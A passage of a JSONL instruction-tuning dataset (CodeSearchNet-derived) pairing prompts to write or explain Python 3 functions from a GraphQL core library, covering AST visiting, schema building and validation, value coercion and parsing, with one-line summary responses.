isinstance(node, list):\n            result = None\n        else:\n            if not isinstance(node, Node):\n                raise TypeError(f\"Not an AST Node: {inspect(node)}\")\n            visit_fn = visitor.get_visit_fn(node.kind, is_leaving)\n            if visit_fn:\n                result = visit_fn(visitor, node, key, parent, path, ancestors)\n\n                if result is BREAK:\n                    break\n\n                if result is SKIP:\n                    if not is_leaving:\n                        path_pop()\n                        continue\n\n                elif result is not None:\n                    edits.append((key, result))\n                    if not is_leaving:\n                        if isinstance(result, Node):\n                            node = result\n                        else:\n                            path_pop()\n                            continue\n            else:\n                result = None\n\n        if result is None and is_edited:\n            edits.append((key, node))\n\n        if is_leaving:\n            if path:\n                path_pop()\n        else:\n            stack = Stack(in_array, idx, keys, edits, stack)\n            in_array = isinstance(node, list)\n            keys = node if in_array else visitor_keys.get(node.kind, ())\n            idx = -1\n            edits = []\n            if parent:\n                ancestors_append(parent)\n            parent = node\n\n        if not stack:\n            break\n\n    if edits:\n        new_root = edits[-1][1]\n\n    return new_root"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_visit_fn(cls, kind, is_leaving=False) -> Callable:\n        method = \"leave\" if is_leaving else \"enter\"\n        visit_fn = getattr(cls, f\"{method}_{kind}\", None)\n        if not visit_fn:\n            visit_fn = getattr(cls, method, None)\n        return visit_fn", "response": "Get the visit function for the given node kind and direction."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nvalidate a GraphQL schema.", "response": "def validate_schema(schema: GraphQLSchema) -> List[GraphQLError]:\n    \"\"\"Validate a GraphQL schema.\n\n    Implements the \"Type Validation\" sub-sections of the specification's \"Type System\"\n    section.\n\n    Validation runs synchronously, returning a list of encountered errors, or an empty\n    list if no errors were encountered and the Schema is valid.\n    \"\"\"\n    # First check to ensure the provided value is in fact a GraphQLSchema.\n    assert_schema(schema)\n\n    # If this Schema has already been validated, return the previous results.\n    # noinspection PyProtectedMember\n    errors = schema._validation_errors\n    if errors is None:\n\n        # Validate the schema, producing a list of errors.\n        context = SchemaValidationContext(schema)\n        context.validate_root_types()\n        context.validate_directives()\n        context.validate_types()\n\n        # Persist the results of validation before returning to ensure validation does\n        # not run multiple times for this schema.\n        errors = context.errors\n        schema._validation_errors = errors\n\n    return errors"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef separate_operations(document_ast: DocumentNode) -> Dict[str, DocumentNode]:\n\n    # Populate metadata and build a dependency graph.\n    visitor = SeparateOperations()\n    visit(document_ast, visitor)\n    operations = visitor.operations\n    fragments = visitor.fragments\n    positions = visitor.positions\n    dep_graph = visitor.dep_graph\n\n    # For each operation, produce a new synthesized AST which includes only what is\n    # necessary for completing that operation.\n    separated_document_asts = {}\n    for operation in operations:\n        operation_name = op_name(operation)\n        dependencies: Set[str] = set()\n        collect_transitive_dependencies(dependencies, dep_graph, operation_name)\n\n        # The list of definition nodes to be included for this operation, sorted to\n        # retain the same order as the original document.\n        definitions: List[ExecutableDefinitionNode] = [operation]\n        for name in dependencies:\n            definitions.append(fragments[name])\n            definitions.sort(key=lambda n: positions.get(n, 0))\n\n        separated_document_asts[operation_name] = DocumentNode(definitions=definitions)\n\n    return separated_document_asts", "response": "Separate operations in a given AST document."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef collect_transitive_dependencies(\n    collected: Set[str], dep_graph: DepGraph, from_name: str\n) -> None:\n    \"\"\"Collect transitive dependencies.\n\n    From a dependency graph, collects a list of transitive dependencies by recursing\n    through a dependency graph.\n    \"\"\"\n    immediate_deps = dep_graph[from_name]\n    for to_name in immediate_deps:\n        if to_name not in collected:\n            collected.add(to_name)\n            collect_transitive_dependencies(collected, dep_graph, to_name)", "response": "Collect transitive dependencies.\n\n    From a dependency graph, collects a list of transitive dependencies by recursing\n    through a dependency graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nproduces a GraphQL Value AST given a Python value.", "response": "def ast_from_value(value: Any, type_: GraphQLInputType) -> Optional[ValueNode]:\n    \"\"\"Produce a GraphQL Value AST given a Python value.\n\n    A GraphQL type must be provided, which will be used to interpret different Python\n    values.\n\n    | JSON Value    | GraphQL Value        |\n    | ------------- | -------------------- |\n    | Object        | Input Object         |\n    | Array         | List                 |\n    | Boolean       | Boolean              |\n    | String        | String / Enum Value  |\n    | Number        | Int / Float          |\n    | Mixed         | Enum Value           |\n    | null          | NullValue            |\n\n    \"\"\"\n    if is_non_null_type(type_):\n        type_ = cast(GraphQLNonNull, type_)\n        ast_value = ast_from_value(value, type_.of_type)\n        if isinstance(ast_value, NullValueNode):\n            return None\n        return ast_value\n\n    # only explicit None, not INVALID or NaN\n    if value is None:\n        return NullValueNode()\n\n    # INVALID or NaN\n    if is_invalid(value):\n        return None\n\n    # Convert Python list to GraphQL list. If the GraphQLType is a list, but the value\n    # is not a list, convert the value using the list's item type.\n    if is_list_type(type_):\n        type_ = cast(GraphQLList, type_)\n        item_type = type_.of_type\n        if isinstance(value, Iterable) and not isinstance(value, str):\n            value_nodes = [\n                ast_from_value(item, item_type) for item in value  # type: ignore\n            ]\n            return ListValueNode(values=value_nodes)\n        return ast_from_value(value, item_type)  # type: ignore\n\n    # Populate the fields of the input object by creating ASTs from each value in the\n    # Python dict according to the fields in the input type.\n    if is_input_object_type(type_):\n        if value is None or not isinstance(value, Mapping):\n            return None\n        type_ = cast(GraphQLInputObjectType, type_)\n        field_nodes: List[ObjectFieldNode] = []\n        append_node = field_nodes.append\n        for field_name, field in type_.fields.items():\n            if field_name in value:\n                field_value = ast_from_value(value[field_name], field.type)\n                if field_value:\n                    append_node(\n                        ObjectFieldNode(\n                            name=NameNode(value=field_name), value=field_value\n                        )\n                    )\n        return ObjectValueNode(fields=field_nodes)\n\n    if is_leaf_type(type_):\n        # Since value is an internally represented value, it must be serialized to an\n        # externally represented value before converting into an AST.\n        serialized = type_.serialize(value)  # type: ignore\n        if is_nullish(serialized):\n            return None\n\n        # Others serialize based on their corresponding Python scalar types.\n        if isinstance(serialized, bool):\n            return BooleanValueNode(value=serialized)\n\n        # Python ints and floats correspond nicely to Int and Float values.\n        if isinstance(serialized, int):\n            return IntValueNode(value=f\"{serialized:d}\")\n        if isinstance(serialized, float):\n            return FloatValueNode(value=f\"{serialized:g}\")\n\n        if isinstance(serialized, str):\n            # Enum types use Enum literals.\n            if is_enum_type(type_):\n                return EnumValueNode(value=serialized)\n\n            # ID types can use Int literals.\n            if type_ is GraphQLID and _re_integer_string.match(serialized):\n                return IntValueNode(value=serialized)\n\n            return StringValueNode(value=serialized)\n\n        raise TypeError(f\"Cannot convert value to AST: {inspect(serialized)}\")\n\n    # Not reachable. All possible input types have been considered.\n    raise TypeError(f\"Unexpected input type: '{inspect(type_)}'.\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the variable values based on the provided variable definitions and arbitrary input.", "response": "def get_variable_values(\n    schema: GraphQLSchema,\n    var_def_nodes: List[VariableDefinitionNode],\n    inputs: Dict[str, Any],\n) -> CoercedVariableValues:\n    \"\"\"Get coerced variable values based on provided definitions.\n\n    Prepares a dict of variable values of the correct type based on the provided\n    variable definitions and arbitrary input. If the input cannot be parsed to match\n    the variable definitions, a GraphQLError will be thrown.\n    \"\"\"\n    errors: List[GraphQLError] = []\n    coerced_values: Dict[str, Any] = {}\n    for var_def_node in var_def_nodes:\n        var_name = var_def_node.variable.name.value\n        var_type = type_from_ast(schema, var_def_node.type)\n        if not is_input_type(var_type):\n            # Must use input types for variables. This should be caught during\n            # validation, however is checked again here for safety.\n            errors.append(\n                GraphQLError(\n                    f\"Variable '${var_name}' expected value of type\"\n                    f\" '{print_ast(var_def_node.type)}'\"\n                    \" which cannot be used as an input type.\",\n                    var_def_node.type,\n                )\n            )\n        else:\n            var_type = cast(GraphQLInputType, var_type)\n            has_value = var_name in inputs\n            value = inputs[var_name] if has_value else INVALID\n            if not has_value and var_def_node.default_value:\n                # If no value was provided to a variable with a default value, use the\n                # default value.\n                coerced_values[var_name] = value_from_ast(\n                    var_def_node.default_value, var_type\n                )\n            elif (not has_value or value is None) and is_non_null_type(var_type):\n                errors.append(\n                    GraphQLError(\n                        f\"Variable '${var_name}' of non-null type\"\n                        f\" '{var_type}' must not be null.\"\n                        if has_value\n                        else f\"Variable '${var_name}' of required type\"\n                        f\" '{var_type}' was not provided.\",\n                        var_def_node,\n                    )\n                )\n            elif has_value:\n                if value is None:\n                    # If the explicit value `None` was provided, an entry in the\n                    # coerced values must exist as the value `None`.\n                    coerced_values[var_name] = None\n                else:\n                    # Otherwise, a non-null value was provided, coerce it to the\n                    # expected type or report an error if coercion fails.\n                    coerced = coerce_value(value, var_type, var_def_node)\n                    coercion_errors = coerced.errors\n                    if coercion_errors:\n                        for error in coercion_errors:\n                            error.message = (\n                                f\"Variable '${var_name}' got invalid\"\n                                f\" value {inspect(value)}; {error.message}\"\n                            )\n                        errors.extend(coercion_errors)\n                    else:\n                        coerced_values[var_name] = coerced.value\n    return (\n        CoercedVariableValues(errors, None)\n        if errors\n        else CoercedVariableValues(None, coerced_values)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_argument_values(\n    type_def: Union[GraphQLField, GraphQLDirective],\n    node: Union[FieldNode, DirectiveNode],\n    variable_values: Dict[str, Any] = None,\n) -> Dict[str, Any]:\n    \"\"\"Get coerced argument values based on provided definitions and nodes.\n\n    Prepares an dict of argument values given a list of argument definitions and list\n    of argument AST nodes.\n    \"\"\"\n    coerced_values: Dict[str, Any] = {}\n    arg_defs = type_def.args\n    arg_nodes = node.arguments\n    if not arg_defs or arg_nodes is None:\n        return coerced_values\n    arg_node_map = {arg.name.value: arg for arg in arg_nodes}\n    for name, arg_def in arg_defs.items():\n        arg_type = arg_def.type\n        argument_node = cast(ArgumentNode, arg_node_map.get(name))\n        variable_values = cast(Dict[str, Any], variable_values)\n        if argument_node and isinstance(argument_node.value, VariableNode):\n            variable_name = argument_node.value.name.value\n            has_value = variable_values and variable_name in variable_values\n            is_null = has_value and variable_values[variable_name] is None\n        else:\n            has_value = argument_node is not None\n            is_null = has_value and isinstance(argument_node.value, NullValueNode)\n        if not has_value and arg_def.default_value is not INVALID:\n            # If no argument was provided where the definition has a default value,\n            # use the default value.\n            coerced_values[name] = arg_def.default_value\n        elif (not has_value or is_null) and is_non_null_type(arg_type):\n            # If no argument or a null value was provided to an argument with a non-null\n            # type (required), produce a field error.\n            if is_null:\n                raise GraphQLError(\n                    f\"Argument '{name}' of non-null type\"\n                    f\" '{arg_type}' must not be null.\",\n                    argument_node.value,\n                )\n            elif argument_node and isinstance(argument_node.value, VariableNode):\n                raise GraphQLError(\n                    f\"Argument '{name}' of required type\"\n                    f\" '{arg_type}' was provided the variable\"\n                    f\" '${variable_name}'\"\n                    \" which was not provided a runtime value.\",\n                    argument_node.value,\n                )\n            else:\n                raise GraphQLError(\n                    f\"Argument '{name}' of required type '{arg_type}'\"\n                    \" was not provided.\",\n                    node,\n                )\n        elif has_value:\n            if isinstance(argument_node.value, NullValueNode):\n                # If the explicit value `None` was provided, an entry in the coerced\n                # values must exist as the value `None`.\n                coerced_values[name] = None\n            elif isinstance(argument_node.value, VariableNode):\n                variable_name = argument_node.value.name.value\n                # Note: This Does no further checking that this variable is correct.\n                # This assumes that this query has been validated and the variable\n                # usage here is of the correct type.\n                coerced_values[name] = variable_values[variable_name]\n            else:\n                value_node = argument_node.value\n                coerced_value = value_from_ast(value_node, arg_type, variable_values)\n                if coerced_value is INVALID:\n                    # Note: `values_of_correct_type` validation should catch this before\n                    # execution. This is a runtime check to ensure execution does not\n                    # continue with an invalid argument value.\n                    raise GraphQLError(\n                        f\"Argument '{name}'\"\n                        f\" has invalid value {print_ast(value_node)}.\",\n                        argument_node.value,\n                    )\n                coerced_values[name] = coerced_value\n    return coerced_values", "response": "Returns a dict of argument values given a list of argument definitions and nodes."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_directive_values(\n    directive_def: GraphQLDirective,\n    node: NodeWithDirective,\n    variable_values: Dict[str, Any] = None,\n) -> Optional[Dict[str, Any]]:\n    \"\"\"Get coerced argument values based on provided nodes.\n\n    Prepares a dict of argument values given a directive definition and an AST node\n    which may contain directives. Optionally also accepts a dict of variable values.\n\n    If the directive does not exist on the node, returns None.\n    \"\"\"\n    directives = node.directives\n    if directives:\n        directive_name = directive_def.name\n        for directive in directives:\n            if directive.name.value == directive_name:\n                return get_argument_values(directive_def, directive, variable_values)\n    return None", "response": "Returns a dict of argument values given a directive definition and an AST node."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef build_ast_schema(\n    document_ast: DocumentNode,\n    assume_valid: bool = False,\n    assume_valid_sdl: bool = False,\n) -> GraphQLSchema:\n    \"\"\"Build a GraphQL Schema from a given AST.\n\n    This takes the ast of a schema document produced by the parse function in\n    src/language/parser.py.\n\n    If no schema definition is provided, then it will look for types named Query\n    and Mutation.\n\n    Given that AST it constructs a GraphQLSchema. The resulting schema has no\n    resolve methods, so execution will use default resolvers.\n\n    When building a schema from a GraphQL service's introspection result, it might\n    be safe to assume the schema is valid. Set `assume_valid` to True to assume the\n    produced schema is valid. Set `assume_valid_sdl` to True to assume it is already\n    a valid SDL document.\n    \"\"\"\n    if not isinstance(document_ast, DocumentNode):\n        raise TypeError(\"Must provide a Document AST.\")\n\n    if not (assume_valid or assume_valid_sdl):\n        from ..validation.validate import assert_valid_sdl\n\n        assert_valid_sdl(document_ast)\n\n    schema_def: Optional[SchemaDefinitionNode] = None\n    type_defs: List[TypeDefinitionNode] = []\n    directive_defs: List[DirectiveDefinitionNode] = []\n    append_directive_def = directive_defs.append\n    for def_ in document_ast.definitions:\n        if isinstance(def_, SchemaDefinitionNode):\n            schema_def = def_\n        elif isinstance(def_, TypeDefinitionNode):\n            def_ = cast(TypeDefinitionNode, def_)\n            type_defs.append(def_)\n        elif isinstance(def_, DirectiveDefinitionNode):\n            append_directive_def(def_)\n\n    def resolve_type(type_name: str) -> GraphQLNamedType:\n        type_ = type_map.get(type_name)\n        if not type:\n            raise TypeError(f\"Type '{type_name}' not found in document.\")\n        return type_\n\n    ast_builder = ASTDefinitionBuilder(\n        assume_valid=assume_valid, resolve_type=resolve_type\n    )\n\n    type_map = {node.name.value: ast_builder.build_type(node) for node in type_defs}\n\n    if schema_def:\n        operation_types = get_operation_types(schema_def)\n    else:\n        operation_types = {\n            OperationType.QUERY: \"Query\",\n            OperationType.MUTATION: \"Mutation\",\n            OperationType.SUBSCRIPTION: \"Subscription\",\n        }\n\n    directives = [\n        ast_builder.build_directive(directive_def) for directive_def in directive_defs\n    ]\n\n    # If specified directives were not explicitly declared, add them.\n    if not any(directive.name == \"skip\" for directive in directives):\n        directives.append(GraphQLSkipDirective)\n    if not any(directive.name == \"include\" for directive in directives):\n        directives.append(GraphQLIncludeDirective)\n    if not any(directive.name == \"deprecated\" for directive in directives):\n        directives.append(GraphQLDeprecatedDirective)\n\n    query_type = operation_types.get(OperationType.QUERY)\n    mutation_type = operation_types.get(OperationType.MUTATION)\n    subscription_type = operation_types.get(OperationType.SUBSCRIPTION)\n    return GraphQLSchema(\n        # Note: While this could make early assertions to get the correctly\n        # typed values below, that would throw immediately while type system\n        # validation with `validate_schema()` will produce more actionable results.\n        query=cast(GraphQLObjectType, type_map.get(query_type)) if query_type else None,\n        mutation=cast(GraphQLObjectType, type_map.get(mutation_type))\n        if mutation_type\n        else None,\n        subscription=cast(GraphQLObjectType, type_map.get(subscription_type))\n        if subscription_type\n        else None,\n        types=list(type_map.values()),\n        directives=directives,\n        ast_node=schema_def,\n        assume_valid=assume_valid,\n    )", "response": "Builds a GraphQLSchema from a given AST."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_deprecation_reason(\n    node: Union[EnumValueDefinitionNode, FieldDefinitionNode]\n) -> Optional[str]:\n    \"\"\"Given a field or enum value node, get deprecation reason as string.\"\"\"\n    from ..execution import get_directive_values\n\n    deprecated = get_directive_values(GraphQLDeprecatedDirective, node)\n    return deprecated[\"reason\"] if deprecated else None", "response": "Given a field or enum value node get the deprecation reason as string."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef build_schema(\n    source: Union[str, Source],\n    assume_valid=False,\n    assume_valid_sdl=False,\n    no_location=False,\n    experimental_fragment_variables=False,\n) -> GraphQLSchema:\n    \"\"\"Build a GraphQLSchema directly from a source document.\"\"\"\n    return build_ast_schema(\n        parse(\n            source,\n            no_location=no_location,\n            experimental_fragment_variables=experimental_fragment_variables,\n        ),\n        assume_valid=assume_valid,\n        assume_valid_sdl=assume_valid_sdl,\n    )", "response": "Build a GraphQLSchema directly from a source document."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef validate(\n    schema: GraphQLSchema,\n    document_ast: DocumentNode,\n    rules: Sequence[RuleType] = None,\n    type_info: TypeInfo = None,\n) -> List[GraphQLError]:\n    \"\"\"Implements the \"Validation\" section of the spec.\n\n    Validation runs synchronously, returning a list of encountered errors, or an empty\n    list if no errors were encountered and the document is valid.\n\n    A list of specific validation rules may be provided. If not provided, the default\n    list of rules defined by the GraphQL specification will be used.\n\n    Each validation rule is a ValidationRule object which is a visitor object that holds\n    a ValidationContext (see the language/visitor API). Visitor methods are expected to\n    return GraphQLErrors, or lists of GraphQLErrors when invalid.\n\n    Optionally a custom TypeInfo instance may be provided. If not provided, one will be\n    created from the provided schema.\n    \"\"\"\n    if not document_ast or not isinstance(document_ast, DocumentNode):\n        raise TypeError(\"You must provide a document node.\")\n    # If the schema used for validation is invalid, throw an error.\n    assert_valid_schema(schema)\n    if type_info is None:\n        type_info = TypeInfo(schema)\n    elif not isinstance(type_info, TypeInfo):\n        raise TypeError(f\"Not a TypeInfo object: {inspect(type_info)}\")\n    if rules is None:\n        rules = specified_rules\n    elif not isinstance(rules, (list, tuple)):\n        raise TypeError(\"Rules must be passed as a list/tuple.\")\n    context = ValidationContext(schema, document_ast, type_info)\n    # This uses a specialized visitor which runs multiple visitors in parallel,\n    # while maintaining the visitor skip and break API.\n    visitors = [rule(context) for rule in rules]\n    # Visit the whole document with each instance of all provided rules.\n    visit(document_ast, TypeInfoVisitor(type_info, ParallelVisitor(visitors)))\n    return context.errors", "response": "Implements the Validation section of the spec."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef validate_sdl(\n    document_ast: DocumentNode,\n    schema_to_extend: GraphQLSchema = None,\n    rules: Sequence[RuleType] = None,\n) -> List[GraphQLError]:\n    \"\"\"Validate an SDL document.\"\"\"\n    context = SDLValidationContext(document_ast, schema_to_extend)\n    if rules is None:\n        rules = specified_sdl_rules\n    visitors = [rule(context) for rule in rules]\n    visit(document_ast, ParallelVisitor(visitors))\n    return context.errors", "response": "Validate an SDL document."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef assert_valid_sdl(document_ast: DocumentNode) -> None:\n\n    errors = validate_sdl(document_ast)\n    if errors:\n        raise TypeError(\"\\n\\n\".join(error.message for error in errors))", "response": "Assert a SDL document is valid SDL."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nassert a SDL document is a valid SDL extension.", "response": "def assert_valid_sdl_extension(\n    document_ast: DocumentNode, schema: GraphQLSchema\n) -> None:\n    \"\"\"Assert document is a valid SDL extension.\n\n    Utility function which asserts a SDL document is valid by throwing an error if it\n    is invalid.\n    \"\"\"\n\n    errors = validate_sdl(document_ast, schema)\n    if errors:\n        raise TypeError(\"\\n\\n\".join(error.message for error in errors))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nproduce a Python value given a GraphQL Value AST.", "response": "def value_from_ast_untyped(\n    value_node: ValueNode, variables: Dict[str, Any] = None\n) -> Any:\n    \"\"\"Produce a Python value given a GraphQL Value AST.\n\n    Unlike `value_from_ast()`, no type is provided. The resulting Python value will\n    reflect the provided GraphQL value AST.\n\n    | GraphQL Value        | JSON Value | Python Value |\n    | -------------------- | ---------- | ------------ |\n    | Input Object         | Object     | dict         |\n    | List                 | Array      | list         |\n    | Boolean              | Boolean    | bool         |\n    | String / Enum        | String     | str          |\n    | Int / Float          | Number     | int / float  |\n    | Null                 | null       | None         |\n\n    \"\"\"\n    func = _value_from_kind_functions.get(value_node.kind)\n    if func:\n        return func(value_node, variables)\n\n    # Not reachable. All possible value nodes have been considered.\n    raise TypeError(  # pragma: no cover\n        f\"Unexpected value node: '{inspect(value_node)}'.\"\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef type_from_ast(schema, type_node):  # noqa: F811\n    if isinstance(type_node, ListTypeNode):\n        inner_type = type_from_ast(schema, type_node.type)\n        return GraphQLList(inner_type) if inner_type else None\n    if isinstance(type_node, NonNullTypeNode):\n        inner_type = type_from_ast(schema, type_node.type)\n        return GraphQLNonNull(inner_type) if inner_type else None\n    if isinstance(type_node, NamedTypeNode):\n        return schema.get_type(type_node.name.value)\n\n    # Not reachable. All possible type nodes have been considered.\n    raise TypeError(  # pragma: no cover\n        f\"Unexpected type node: '{inspect(type_node)}'.\"\n    )", "response": "Get the GraphQL type definition from an AST node."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting a list of suggested type names for a given field name.", "response": "def get_suggested_type_names(\n    schema: GraphQLSchema, type_: GraphQLOutputType, field_name: str\n) -> List[str]:\n    \"\"\"\n    Get a list of suggested type names.\n\n    Go through all of the implementations of type, as well as the interfaces\n    that they implement. If any of those types include the provided field,\n    suggest them, sorted by how often the type is referenced, starting with\n    Interfaces.\n    \"\"\"\n    if is_abstract_type(type_):\n        type_ = cast(GraphQLAbstractType, type_)\n        suggested_object_types = []\n        interface_usage_count: Dict[str, int] = defaultdict(int)\n        for possible_type in schema.get_possible_types(type_):\n            if field_name not in possible_type.fields:\n                continue\n            # This object type defines this field.\n            suggested_object_types.append(possible_type.name)\n            for possible_interface in possible_type.interfaces:\n                if field_name not in possible_interface.fields:\n                    continue\n                # This interface type defines this field.\n                interface_usage_count[possible_interface.name] += 1\n\n        # Suggest interface types based on how common they are.\n        suggested_interface_types = sorted(\n            interface_usage_count, key=lambda k: -interface_usage_count[k]\n        )\n\n        # Suggest both interface and object types.\n        return suggested_interface_types + suggested_object_types\n\n    # Otherwise, must be an Object type, which does not have possible fields.\n    return []"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_suggested_field_names(type_: GraphQLOutputType, field_name: str) -> List[str]:\n    if is_object_type(type_) or is_interface_type(type_):\n        possible_field_names = list(type_.fields)  # type: ignore\n        return suggestion_list(field_name, possible_field_names)\n    # Otherwise, must be a Union type, which does not define fields.\n    return []", "response": "Get a list of suggested field names for the given field name."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef lexicographic_sort_schema(schema: GraphQLSchema) -> GraphQLSchema:\n\n    def replace_type(type_):\n        if is_list_type(type_):\n            return GraphQLList(replace_type(type_.of_type))\n        elif is_non_null_type(type_):\n            return GraphQLNonNull(replace_type(type_.of_type))\n        else:\n            return replace_named_type(type_)\n\n    def replace_named_type(type_: GraphQLNamedType) -> GraphQLNamedType:\n        return type_map[type_.name]\n\n    def replace_maybe_type(maybe_type):\n        return maybe_type and replace_named_type(maybe_type)\n\n    def sort_directive(directive):\n        kwargs = directive.to_kwargs()\n        kwargs.update(\n            locations=sorted(directive.locations, key=sort_by_name_key),\n            args=sort_args(directive.args),\n        )\n        return GraphQLDirective(**kwargs)\n\n    def sort_args(args_map):\n        args = {}\n        for name, arg in sorted(args_map.items()):\n            kwargs = arg.to_kwargs()\n            kwargs.update(type_=replace_type(arg.type))\n            args[name] = GraphQLArgument(**kwargs)\n        return args\n\n    def sort_fields(fields_map):\n        fields = {}\n        for name, field in sorted(fields_map.items()):\n            kwargs = field.to_kwargs()\n            kwargs.update(type_=replace_type(field.type), args=sort_args(field.args))\n            fields[name] = GraphQLField(**kwargs)\n        return fields\n\n    def sort_input_fields(fields_map):\n        return {\n            name: GraphQLInputField(\n                replace_type(field.type),\n                description=field.description,\n                default_value=field.default_value,\n                ast_node=field.ast_node,\n            )\n            for name, field in sorted(fields_map.items())\n        }\n\n    def sort_types(arr: List[GraphQLNamedType]) -> List[GraphQLNamedType]:\n        return [\n            replace_named_type(type_) for type_ in sorted(arr, key=sort_by_name_key)\n        ]\n\n    def sort_named_type(type_: GraphQLNamedType) -> GraphQLNamedType:\n        if is_scalar_type(type_) or is_introspection_type(type_):\n            return type_\n        elif is_object_type(type_):\n            kwargs = type_.to_kwargs()\n            object_type = cast(GraphQLObjectType, type_)\n            # noinspection PyTypeChecker\n            kwargs.update(\n                interfaces=lambda: sort_types(object_type.interfaces),  # type: ignore\n                fields=lambda: sort_fields(object_type.fields),\n            )\n            return GraphQLObjectType(**kwargs)\n        elif is_interface_type(type_):\n            kwargs = type_.to_kwargs()\n            interface_type = cast(GraphQLInterfaceType, type_)\n            kwargs.update(fields=lambda: sort_fields(interface_type.fields))\n            return GraphQLInterfaceType(**kwargs)\n        elif is_union_type(type_):\n            kwargs = type_.to_kwargs()\n            union_type = cast(GraphQLUnionType, type_)\n            # noinspection PyTypeChecker\n            kwargs.update(types=lambda: sort_types(union_type.types))  # type: ignore\n            return GraphQLUnionType(**kwargs)\n        elif is_enum_type(type_):\n            kwargs = type_.to_kwargs()\n            enum_type = cast(GraphQLEnumType, type_)\n            kwargs.update(\n                values={\n                    name: GraphQLEnumValue(\n                        val.value,\n                        description=val.description,\n                        deprecation_reason=val.deprecation_reason,\n                        ast_node=val.ast_node,\n                    )\n                    for name, val in sorted(enum_type.values.items())\n                }\n            )\n            return GraphQLEnumType(**kwargs)\n        elif is_input_object_type(type_):\n            kwargs = type_.to_kwargs()\n            input_object_type = cast(GraphQLInputObjectType, type_)\n            kwargs.update(fields=lambda: sort_input_fields(input_object_type.fields))\n            return GraphQLInputObjectType(**kwargs)\n\n        # Not reachable. All possible types have been considered.\n        raise TypeError(f\"Unexpected type: '{inspect(type_)}'.\")  # pragma: no cover\n\n    type_map: Dict[str, GraphQLNamedType] = {\n        type_.name: sort_named_type(type_)\n        for type_ in sorted(schema.type_map.values(), key=sort_by_name_key)\n    }\n\n    return GraphQLSchema(\n        types=list(type_map.values()),\n        directives=[\n            sort_directive(directive)\n            for directive in sorted(schema.directives, key=sort_by_name_key)\n        ],\n        query=replace_maybe_type(schema.query_type),\n        mutation=replace_maybe_type(schema.mutation_type),\n        subscription=replace_maybe_type(schema.subscription_type),\n        ast_node=schema.ast_node,\n    )", "response": "Sort a GraphQLSchema by lexicographic order."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngives a GraphQL source parse it into a Document.", "response": "def parse(\n    source: SourceType, no_location=False, experimental_fragment_variables=False\n) -> DocumentNode:\n    \"\"\"Given a GraphQL source, parse it into a Document.\n\n    Throws GraphQLError if a syntax error is encountered.\n\n    By default, the parser creates AST nodes that know the location in the source that\n    they correspond to. The `no_location` option disables that behavior for performance\n    or testing.\n\n    Experimental features:\n\n    If `experimental_fragment_variables` is set to True, the parser will understand\n    and parse variable definitions contained in a fragment definition. They'll be\n    represented in the `variable_definitions` field of the `FragmentDefinitionNode`.\n\n    The syntax is identical to normal, query-defined variables. For example::\n\n        fragment A($var: Boolean = false) on T  {\n          ...\n        }\n    \"\"\"\n    if isinstance(source, str):\n        source = Source(source)\n    elif not isinstance(source, Source):\n        raise TypeError(f\"Must provide Source. Received: {inspect(source)}\")\n    lexer = Lexer(\n        source,\n        no_location=no_location,\n        experimental_fragment_variables=experimental_fragment_variables,\n    )\n    return parse_document(lexer)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_value(source: SourceType, **options: dict) -> ValueNode:\n    if isinstance(source, str):\n        source = Source(source)\n    lexer = Lexer(source, **options)\n    expect_token(lexer, TokenKind.SOF)\n    value = parse_value_literal(lexer, False)\n    expect_token(lexer, TokenKind.EOF)\n    return value", "response": "Parse the AST for a given string containing a GraphQL value."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_type(source: SourceType, **options: dict) -> TypeNode:\n    if isinstance(source, str):\n        source = Source(source)\n    lexer = Lexer(source, **options)\n    expect_token(lexer, TokenKind.SOF)\n    type_ = parse_type_reference(lexer)\n    expect_token(lexer, TokenKind.EOF)\n    return type_", "response": "Parse the AST for a given string containing a GraphQL Type."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert a name lex token into a name parse node.", "response": "def parse_name(lexer: Lexer) -> NameNode:\n    \"\"\"Convert a name lex token into a name parse node.\"\"\"\n    token = expect_token(lexer, TokenKind.NAME)\n    return NameNode(value=token.value, loc=loc(lexer, token))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nparse a definition node.", "response": "def parse_definition(lexer: Lexer) -> DefinitionNode:\n    \"\"\"Definition: ExecutableDefinition or TypeSystemDefinition\"\"\"\n    if peek(lexer, TokenKind.NAME):\n        func = _parse_definition_functions.get(cast(str, lexer.token.value))\n        if func:\n            return func(lexer)\n    elif peek(lexer, TokenKind.BRACE_L):\n        return parse_executable_definition(lexer)\n    elif peek_description(lexer):\n        return parse_type_system_definition(lexer)\n    raise unexpected(lexer)"}
